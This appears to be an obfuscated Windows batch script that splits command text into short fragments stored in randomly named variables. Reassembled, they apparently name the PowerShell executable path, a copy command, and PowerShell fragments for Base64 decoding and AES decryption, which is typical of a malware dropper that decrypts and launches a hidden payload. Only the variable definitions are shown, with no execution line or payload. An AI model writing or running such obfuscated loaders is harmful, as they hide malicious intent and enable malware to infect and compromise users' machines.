@echo off
set "EIynIQRMXY=Wi"
set "PomWYoTfrY=1."
set "jbMVXnxIMi=we"
set "QiiXhzZWuo=ow"
set "ezhcVlGOhm=rs"
set "RYxCIMogqC=co"
set "BJFKwXFybN=ll"
set "HZwgGlptfX=rS"
set "RtCueYuMJJ=0\"
set "OjtGjxZnRU=nd"
set "KuZkKOWgXs= C"
set "PzLIkABUiG=we"
set "vWUpRwZozJ=:\"
set "WjiZEmCoft=Sy"
set "BwFsdbRzxL=in"
set "WzJuOQGHwR=ll"
set "wVHmAbWLCU=s\"
set "WKRaQJydte=\W"
set "KwjXSkbzGm=do"
set "GQsssOruvW=po"
set "iDmjWTdbgY=xe"
set "BnKXXHZjtU=32"
set "vUlmKwjgWf=py"
set "uyNbGfIsTW=Po"
set "ALaBFgJpxg=.e"
set "qDeClFQMoe= /"
set "QUrJBTBgfi=em"
set "xMwETwAAgj=st"
set "EZrpLopvgI=y "
set "FjimkucHuv=\v"
set "apXLPZWTEj=he"
set "xqglngdqSR=ws"
set "YAGGrlIhrN=he"
set "JbPRRaVyHZ=cd"
set "HIaDJuiLaL= %~dp0"
set "eqrgJWaRUy=.Len"
set "KPclhuIdzp=1..-"
set "zqQLIFKEgo=pDZz"
set "cmJVbsfUdV=)($T"
set "GHLBGhuJns=Disp"
set "ggAhEhozsk=ZosY"
set "nIKQBNynYf=S46e"
set "XKHSQiqUUD=Conv"
set "vTPyrHcXiQ= '')"
set "uydMLNTaMU=$TZo"
set "RWLNGJAmaS=XB ="
set "XghOghlUpQ=Secu"
set "hvqyODSjiq=);$T"
set "WnyFsLVLFS=m.Re"
set "QqKxoplrNJ=PKCS"
set "otKeaXWEwj=g = "
set "NYGUOHfvlz=ing("
set "QQrbtlALOF=.Cop"
set "ILcTMqlkRL=Y = "
set "XHOpxFARwu=1] -"
set "XaIvLvBDkh=comm"
set "hEEgwpBPkS=0O+g"
set "PzlkfoTbxs=V = "
set "kXkLiLrIAb=] -j"
set "faFCkDCRQG==');"
set "erCnRlYtpm=join"
set "HkmWvoInyV=ddin"
set "CocCfodjUu=-1.."
